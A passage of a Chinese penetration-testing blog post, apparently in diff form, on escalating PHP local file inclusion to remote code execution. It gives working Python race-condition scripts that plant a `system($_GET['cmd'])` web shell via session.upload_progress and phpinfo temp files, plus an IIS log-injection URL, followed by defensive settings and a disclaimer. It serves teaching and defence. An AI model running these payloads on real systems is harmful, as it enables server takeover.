+<li>通过 LFI 包含：<code>http://target.com/index.php?page=/tmp/sess_abc123&amp;cmd=id</code></li>
+</ol>
+<h3 id="5-3-利用-session-upload-progress（无需注册）"><a href="#5-3-利用-session-upload-progress（无需注册）" class="headerlink" title="5.3 利用 session.upload_progress（无需注册）"></a>5.3 利用 session.upload_progress（无需注册）</h3><p>PHP 5.4 引入 <code>session.upload_progress</code>，默认启用。攻击者可利用上传进度追踪机制将 PHP 代码写入 Session。</p>
+<p>攻击者上传文件时传递 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 字段，PHP 自动创建 Session 并将字段值写入文件。核心在于竞争窗口——Session 在上传期间存在，上传完成后被清理。</p>
+<p><strong>Python 利用脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, threading</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://target.com/index.php&quot;</span></span><br><span class="line">lfi_param = <span class="string">&quot;page&quot;</span></span><br><span class="line">session_path = <span class="string">&quot;/tmp/sess_attacker&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url,</span><br><span class="line">                files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, BytesIO(<span class="string">b&#x27;A&#x27;</span>*<span class="number">1024</span>))&#125;,</span><br><span class="line">                data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;attacker&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfi</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(</span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?<span class="subst">&#123;lfi_param&#125;</span>=<span class="subst">&#123;session_path&#125;</span>&amp;cmd=id&quot;</span>,</span><br><span class="line">                cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;attacker&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;uid=&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] RCE: <span class="subst">&#123;r.text&#125;</span>&quot;</span>); <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">threading.Thread(target=upload).start()</span><br><span class="line">threading.Thread(target=lfi).start()</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-Session-路径汇总"><a href="#5-4-Session-路径汇总" class="headerlink" title="5.4 Session 路径汇总"></a>5.4 Session 路径汇总</h3><table>
+<thead>
+<tr>
+<th>环境</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux 默认</td>
+<td><code>/tmp/sess_&lt;id&gt;</code></td>
+</tr>
+<tr>
+<td>Linux Apache</td>
+<td><code>/var/lib/php/sessions/sess_&lt;id&gt;</code></td>
+</tr>
+<tr>
+<td>Windows XAMPP</td>
+<td><code>C:\xampp\tmp\sess_&lt;id&gt;</code></td>
+</tr>
+<tr>
+<td>Windows WAMP</td>
+<td><code>C:\wamp\tmp\sess_&lt;id&gt;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="六、PHP-临时文件包含（phpinfo-LFI-条件竞争）"><a href="#六、PHP-临时文件包含（phpinfo-LFI-条件竞争）" class="headerlink" title="六、PHP 临时文件包含（phpinfo + LFI 条件竞争）"></a>六、PHP 临时文件包含（phpinfo + LFI 条件竞争）</h2><h3 id="6-1-原理"><a href="#6-1-原理" class="headerlink" title="6.1 原理"></a>6.1 原理</h3><p>PHP 处理文件上传时，即使代码没有 <code>move_uploaded_file()</code>，上传数据仍写入临时目录（Linux:<code>/tmp/phpXXXXXX</code>；Windows:<code>C:\Windows\Temp\phpXXXX.tmp</code>），请求结束时清理。</p>
+<p>若 <code>phpinfo()</code> 页面暴露 <code>$_FILES[&#39;tmp_name&#39;]</code>，攻击者可结合 LFI 发起条件竞争：一边上传文件获取临时路径，一边高速包含该文件。</p>
+<h3 id="6-2-利用脚本片段"><a href="#6-2-利用脚本片段" class="headerlink" title="6.2 利用脚本片段"></a>6.2 利用脚本片段</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re, threading</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://target.com&quot;</span></span><br><span class="line">phpinfo_url = <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/phpinfo.php&quot;</span></span><br><span class="line">lfi_url = <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">race</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">        r = requests.post(phpinfo_url, files=files)</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\[tmp_name\] =&gt; (\S+\.tmp)&#x27;</span>, r.text)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            r2 = requests.get(<span class="string">f&quot;<span class="subst">&#123;lfi_url&#125;</span><span class="subst">&#123;m.group(<span class="number">1</span>)&#125;</span>?cmd=id&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;uid=&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] RCE via <span class="subst">&#123;m.group(<span class="number">1</span>)&#125;</span>&quot;</span>); <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    threading.Thread(target=race).start()</span><br></pre></td></tr></table></figure>
+
+<p>社区工具有 <code>LFISuite</code>、<code>phpinfoLFI.py</code> 等可自动化此过程。</p>
+<hr>
+<h2 id="七、Windows-应用日志"><a href="#七、Windows-应用日志" class="headerlink" title="七、Windows 应用日志"></a>七、Windows 应用日志</h2><p>在 Windows 环境中，以下日志可作为注入目标：</p>
+<table>
+<thead>
+<tr>
+<th>日志类型</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IIS Web 日志</td>
+<td><code>C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log</code></td>
+</tr>
+<tr>
+<td>FTP 服务日志</td>
+<td><code>C:\inetpub\logs\LogFiles\FTPSVC1\</code></td>
+</tr>
+<tr>
+<td>SMTP 服务日志</td>
+<td><code>C:\Windows\System32\LogFiles\SMTPSVC1\</code></td>
+</tr>
+<tr>
+<td>事件日志（EVTX）</td>
+<td><code>C:\Windows\System32\winevt\Logs\Application.evtx</code></td>
+</tr>
+</tbody></table>
+<p>IIS 日志和 FTP 日志为纯文本格式，注入原理与 Apache access log 相同——在 User-Agent、URL、Referer 中注入 PHP 代码。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/index.php?page=C:\inetpub\logs\LogFiles\W3SVC1\u_ex250915.log&amp;cmd=dir</span><br></pre></td></tr></table></figure>
+
+<p>需要注意：Windows 事件日志 <code>Application.evtx</code> 是二进制格式，PHP 直接包含时无法解析。</p>
+<hr>
+<h2 id="八、防御措施"><a href="#八、防御措施" class="headerlink" title="八、防御措施"></a>八、防御措施</h2><h3 id="8-1-代码层面"><a href="#8-1-代码层面" class="headerlink" title="8.1 代码层面"></a>8.1 代码层面</h3><p>永远使用<strong>白名单映射</strong>，而非直接拼接用户输入到包含路径：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pages</span> = [</span><br><span class="line">    <span class="string">&#x27;home&#x27;</span>  =&gt; <span class="string">&#x27;/var/www/templates/home.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;about&#x27;</span> =&gt; <span class="string">&#x27;/var/www/templates/about.php&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$page</span>, <span class="variable">$pages</span>)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;Invalid page&#x27;</span>); &#125;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$pages</span>[<span class="variable">$page</span>];</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>php.ini</code> 中配置 <code>disable_functions</code> 禁用危险函数：<code>system,exec,passthru,shell_exec,proc_open,popen,curl_exec,curl_multi_exec,show_source</code>。</p>
+<h3 id="8-2-服务器层面"><a href="#8-2-服务器层面" class="headerlink" title="8.2 服务器层面"></a>8.2 服务器层面</h3><ol>
+<li><strong>文件权限</strong>——Apache 日志默认 <code>640 root:adm</code>，阻止 Web 用户读取。</li>
+<li><strong><code>open_basedir</code></strong>——限制 PHP 文件操作范围，排除日志目录和 <code>/proc</code>。</li>
+<li><strong>Session 文件外迁</strong>——使用 Redis 或数据库存储 Session。</li>
+<li><strong>关闭 <code>session.upload_progress</code></strong>——<code>php.ini</code> 中设为 <code>Off</code>。</li>
+<li><strong>隐藏 <code>phpinfo()</code></strong>——生产环境禁用或限制 IP 访问。</li>
+</ol>
+<h3 id="8-3-日志层面"><a href="#8-3-日志层面" class="headerlink" title="8.3 日志层面"></a>8.3 日志层面</h3><p>日志写入前过滤 <code>&lt;%php</code>、<code>&lt;%?=</code> 等标签；在 WAF&#x2F;反向代理层记录日志，确保 Web 本地不写入含无过滤用户输入的日志。</p>
+<hr>
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>LFI 到 RCE 的升级链在满足特定条件时高度可行：</p>
+<table>
+<thead>
+<tr>
+<th>技术</th>
+<th>前提条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Apache access log</td>
+<td>日志路径已知、可读，未过滤 PHP 标签</td>
+</tr>
+<tr>
+<td>SSH auth log</td>
+<td><code>/var/log/auth.log</code> 对 Web 用户可读</td>
+</tr>
+<tr>
+<td>Mail log</td>
+<td>目标运行 SMTP，邮件日志可读</td>
+</tr>
+<tr>
+<td>&#x2F;proc&#x2F;self&#x2F;environ</td>
+<td>Apache CGI 模式，<code>/proc/self/environ</code> 可读</td>
+</tr>
+<tr>
+<td>PHP Session（upload_progress）</td>
+<td><code>session.upload_progress.enabled=On</code>，Session 路径已知</td>
+</tr>
+<tr>
+<td>PHP 临时文件竞争</td>
+<td><code>phpinfo()</code> 暴露，可高速并发 LFI</td>
+</tr>
+<tr>
+<td>Windows IIS 日志</td>
+<td>日志路径已知，纯文本格式</td>
+</tr>
+</tbody></table>
+<p>在实际渗透测试中，日志注入与 Session 包含将”只读漏洞”转为”代码执行”是渗透工程师的核心技能。理解机制、熟练 payload、控制竞争窗口缺一不可。</p>
+<blockquote>
+<p><strong>再次声明</strong>：本文仅用于安全研究与授权测试。未经授权攻击他人系统属于违法犯罪。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Intranet-MSSQL-attacks/" rel="prev" title="MSSQL数据库攻击面">
+                  <i class="fa fa-angle-left"></i> MSSQL数据库攻击面
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Cloud-security-methodology/" rel="next" title="云安全测试方法论">
+                  云安全测试方法论 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
